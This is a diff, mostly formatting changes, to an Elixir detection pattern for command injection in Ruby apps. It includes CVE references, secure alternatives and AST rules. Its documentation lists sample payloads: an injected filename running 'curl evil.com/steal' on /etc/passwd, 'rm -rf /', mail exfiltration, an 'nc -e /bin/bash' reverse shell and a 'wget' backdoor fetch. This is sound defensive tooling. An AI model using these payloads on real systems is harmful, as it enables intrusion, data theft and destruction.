@@ -1,23 +1,23 @@
 defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
   @moduledoc """
   Pattern for detecting command injection vulnerabilities in Ruby applications.
-  
+
   This pattern identifies when user input is directly interpolated into shell commands,
   allowing attackers to execute arbitrary operating system commands on the server.
   Command injection is one of the most severe security vulnerabilities as it provides
   direct access to the underlying system.
-  
+
   ## Vulnerability Details
-  
+
   Command injection occurs when applications execute shell commands using user-controlled
   input without proper validation or sanitization. Ruby provides several ways to execute
   system commands, and all become dangerous when combined with string interpolation:
-  
+
   - **Direct System Access**: Attackers can execute any OS command
   - **Privilege Escalation**: Commands run with application privileges
   - **Data Exfiltration**: Access to file system and network resources
   - **System Compromise**: Full server control in severe cases
-  
+
   ### Attack Example
   ```ruby
   # Vulnerable command execution
@@ -34,14 +34,14 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       # Attack: filename = "file.txt; curl evil.com/steal?data=$(cat /etc/passwd)"
     end
   end
-  
+
   # Attack result: Complete system compromise
   ```
   """
-  
+
   use Rsolv.Security.Patterns.PatternBase
   alias Rsolv.Security.Pattern
-  
+
   @impl true
   def pattern do
     %Pattern{
@@ -84,7 +84,7 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       }
     }
   end
-  
+
   @impl true
   def vulnerability_metadata do
     %{
@@ -92,7 +92,7 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       Command injection is a critical security vulnerability that occurs when an application
       passes unsafe user input to a system shell. In Ruby applications, this typically
       happens when developers use string interpolation to build shell commands dynamically.
-      
+
       **How Command Injection Works:**
       Ruby provides several mechanisms for executing system commands:
       - `system()` - Executes command and returns success/failure
@@ -101,7 +101,7 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       - `%x{}` - Alternative syntax for backticks
       - `IO.popen()` - Opens pipe to command for reading/writing
       - `Open3` methods - Advanced command execution with streams
-      
+
       **Why String Interpolation is Dangerous:**
       When user input is interpolated into command strings, shell metacharacters
       become executable. Common dangerous characters include:
@@ -111,14 +111,14 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       - `$()` and `` (command substitution)
       - `>` and `<` (redirection)
       - `&` (background execution)
-      
+
       **Common Attack Patterns:**
       - **Command chaining**: `; rm -rf /` to execute destructive commands
       - **Command substitution**: `$(cat /etc/passwd)` to extract sensitive data
       - **Pipe injection**: `| mail attacker@evil.com` to exfiltrate data
       - **Background execution**: `& nc -e /bin/bash attacker.com 4444` for reverse shells
       - **Redirection attacks**: `> /dev/null; wget evil.com/backdoor` to hide malicious activity
-      
+
       **Real-World Impact:**
       Command injection vulnerabilities have been responsible for numerous high-profile
       security incidents, including the CVE-2021-31799 RDoc vulnerability that allowed
@@ -128,7 +128,8 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
         %{
           type: :cwe,
           id: "CWE-78",
-          title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+          title:
+            "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
           url: "https://cwe.mitre.org/data/definitions/78.html"
         },
         %{
@@ -147,13 +148,15 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
           type: :research,
           id: "owasp_command_injection_defense",
           title: "OWASP OS Command Injection Defense Cheat Sheet",
-          url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+          url:
+            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
         },
         %{
           type: :research,
           id: "owasp_rails_cheatsheet",
           title: "OWASP Ruby on Rails Cheat Sheet - Command Injection",
-          url: "https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection"
+          url:
+            "https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection"
         }
       ],
       attack_vectors: [
@@ -187,7 +190,7 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
           note: "Malicious Ruby projects could exploit RDoc to execute arbitrary commands"
         },
         %{
-          id: "CVE-2017-17405", 
+          id: "CVE-2017-17405",
           description: "Command injection in Net::FTP through file operations",
           severity: "high",
           cvss: 7.5,
@@ -205,31 +208,32 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
           description: "Command injection in PDFKit Ruby gem",
           severity: "critical",
           cvss: 9.8,
-          note: "URL parameter injection allowed arbitrary command execution during PDF generation"
+          note:
+            "URL parameter injection allowed arbitrary command execution during PDF generation"
         }
       ],
       detection_notes: """
       This pattern detects command injection by looking for Ruby command execution
       methods combined with string interpolation:
-      
+
       **System Command Methods:**
       - system() with interpolated strings
       - Backtick operator (``) with interpolated variables
       - exec() calls with dynamic command construction
       - %x{} percent notation with interpolation
-      
+
       **Advanced Command Execution:**
       - IO.popen() with interpolated command strings
       - Open3 module methods (capture2, capture3, popen3, etc.)
       - Kernel.system and Kernel.exec explicit calls
       - spawn() method with string interpolation
-      
+
       **False Positive Considerations:**
       - Static commands without user input (lower risk)
       - Commands using array form (system(['cmd', 'arg']) - safer)
       - Properly escaped input using Shellwords.escape()
       - Commands in test files (excluded by AST enhancement)
-      
+
       **Detection Limitations:**
       - Complex string building across multiple lines
       - Dynamic method calls or metaprogramming
@@ -257,7 +261,7 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
         ],
         secure_patterns: [
           "system('command', 'arg1', 'arg2') # Array form prevents shell interpretation",
-          "Open3.capture2(['git', 'clone', repo_url]) # Safe argument passing", 
+          "Open3.capture2(['git', 'clone', repo_url]) # Safe argument passing",
           "Shellwords.escape(user_input) # Proper escaping when shell features needed",
           "File.read(filename) # Use Ruby libraries instead of shell commands",
           "Dir.entries(directory) # Native Ruby methods for file operations",
@@ -289,15 +293,15 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       }
     }
   end
-  
+
   @doc """
   Returns AST enhancement rules to reduce false positives.
-  
+
   This enhancement helps distinguish between actual command injection vulnerabilities
   and safe command execution practices.
-  
+
   ## Examples
-  
+
       iex> enhancement = Rsolv.Security.Patterns.Ruby.CommandInjection.ast_enhancement()
       iex> Map.keys(enhancement) |> Enum.sort()
       [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
@@ -312,8 +316,16 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       ast_rules: %{
         node_type: "CallExpression",
         method_names: [
-          "system", "exec", "spawn", "popen", "capture2", "capture3", 
-          "popen2", "popen2e", "popen3", "pipeline"
+          "system",
+          "exec",
+          "spawn",
+          "popen",
+          "capture2",
+          "capture3",
+          "popen2",
+          "popen2e",
+          "popen3",
+          "pipeline"
         ],
         receiver_analysis: %{
           check_kernel_context: true,
@@ -338,12 +350,24 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
         ],
         check_shell_context: true,
         safe_functions: [
-          "Shellwords.escape", "Shellwords.shellescape", "Shellwords.join",
-          "File.basename", "File.dirname", "File.expand_path"
+          "Shellwords.escape",
+          "Shellwords.shellescape",
+          "Shellwords.join",
+          "File.basename",
+          "File.dirname",
+          "File.expand_path"
         ],
         dangerous_sources: [
-          "params", "request", "cookies", "session", "ENV",
-          "gets", "ARGV", "user_input", "form_data", "query"
+          "params",
+          "request",
+          "cookies",
+          "session",
+          "ENV",
+          "gets",
+          "ARGV",
+          "user_input",
+          "form_data",
+          "query"
         ],
         command_execution_patterns: %{
           array_form_safe: true,
